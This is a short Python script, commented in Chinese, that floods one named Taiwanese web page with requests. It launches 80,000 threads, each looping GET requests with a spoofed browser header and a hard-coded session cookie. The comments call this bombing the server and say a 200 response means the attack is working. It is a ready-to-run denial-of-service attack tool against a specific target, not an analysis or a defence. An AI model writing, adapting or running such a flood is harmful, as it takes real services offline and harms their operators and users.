import requests
import threading #多線程
header={
    'Referer':"http://web.a3b6.com.tw/112ntpc/index.aspx", #這邊放referer
    'Cookie':'ASP.NET_SessionId=1tv4uhz3emy4c155ldop2u55; iat=srv-T48I8cAPuNODDS9VTS0Mhw|ZUh9H', #這邊放cookie,如果沒有可以把前面的給註解起來
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' #這邊放user-agent
}
#定義run,反正就是迴圈爬蟲,用一堆蟲蟲炸server
def run(url):
    while True:
        try:
            res=requests.get(url,headers=header)
            print(res.status_code)    #這是看狀態的,要200才會有攻擊力
        except:
            pass    #沒回應就跳過
#這邊for遍歷數字放多少可看作多少線程轟炸
for i in range(80000):threading.Thread(target=run,args=("http://web.a3b6.com.tw/112ntpc/index.aspx",)).start()
